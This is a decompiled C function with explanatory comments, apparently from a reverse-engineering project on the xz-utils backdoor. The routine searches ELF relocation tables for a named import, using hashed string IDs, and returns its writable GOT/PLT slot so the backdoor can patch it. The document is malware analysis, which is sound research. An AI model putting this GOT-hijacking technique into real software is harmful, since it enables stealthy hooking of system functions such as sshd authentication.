// /home/kali/xzre-ghidra/xzregh/101DC0_elf_find_import_reloc_slot.c
// Function: elf_find_import_reloc_slot @ 0x101DC0
// Calling convention: __stdcall
// Prototype: void * __stdcall elf_find_import_reloc_slot(elf_info_t * elf_info, Elf64_Rela * relocs, u32 num_relocs, u64 reloc_type, EncodedStringId encoded_string_id)


/*
 * AutoDoc: Generic helper that scans any relocation array for undefined symbols of a particular relocation type (e.g.,
 * GOT vs. PLT) and encoded name. It walks `num_relocs`, enforces the requested `reloc_type`, confirms the symbol is
 * really an import (`st_shndx == 0`), and hashes the name via `encoded_string_id_lookup` before comparing it to
 * `encoded_string_id`. Matching entries return the relocated slot (`elfbase + r_offset`) so callers can patch GOT/PLT
 * entries in place. Every lookup is gated by `secret_data_append_bits_from_addr_or_ret` so relocation edits only happen while
 * the secret-data recorder is active.
 */

#include "xzre_types.h"

void * elf_find_import_reloc_slot
                 (elf_info_t *elf_info,Elf64_Rela *relocs,u32 num_relocs,u64 reloc_type,
                 EncodedStringId encoded_string_id)

{
  BOOL telemetry_ok;
  EncodedStringId sym_name_id;
  ulong reloc_index;
  
  // AutoDoc: Relocation hunts stay tied to the secret-data log; skip the scan entirely when telemetry fails.
  telemetry_ok = secret_data_append_bits_from_addr_or_ret((void *)0x0,(secret_data_shift_cursor_t)0x67,5,4)
  ;
  reloc_index = 0;
  if (telemetry_ok != FALSE) {
    for (; reloc_index < num_relocs; reloc_index = reloc_index + 1) {
      // AutoDoc: Filter on the relocation type and insist the associated symbol is an unresolved import before hashing the name.
      if ((((relocs->r_info & ELF64_R_TYPE_MASK) == reloc_type) &&
          (elf_info->dynsym[relocs->r_info >> ELF64_R_SYM_SHIFT].st_shndx == 0)) &&
         (sym_name_id = encoded_string_id_lookup
                            (elf_info->dynstr + elf_info->dynsym[relocs->r_info >> ELF64_R_SYM_SHIFT].st_name,
                             (char *)0x0), sym_name_id == encoded_string_id)) {
        // AutoDoc: Hand the caller the writable relocation slot (module base + `r_offset`) once a match is found.
        return (u8 *)elf_info->elfbase + relocs->r_offset;
      }
      relocs = relocs + 1;
    }
  }
  return (void *)0x0;
}

